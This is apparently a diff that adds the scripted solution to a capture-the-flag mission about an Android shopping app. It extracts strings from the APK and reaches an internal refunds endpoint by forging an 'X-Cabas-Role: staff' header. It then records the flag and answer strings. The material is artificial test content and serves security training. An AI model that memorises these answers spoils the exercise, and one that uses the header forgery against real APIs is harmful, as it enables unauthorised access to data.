@@ -1,0 +1,9 @@
+# Side series "L'Appli", mission 2: the shortest path, replayed by CI in every language.
+unzip -l cabas.apk
+unzip -p cabas.apk classes.dex | strings
+curl -s https://api.cabas.test/v4/interne/remboursements
+curl -s -H "X-Cabas-Role: staff" https://api.cabas.test/v4/interne/remboursements
+submit FLAG{cabas-role-cote-client-a27f}
+unzip -p cabas.apk AndroidManifest.xml
+answer backup allowBackup
+answer server
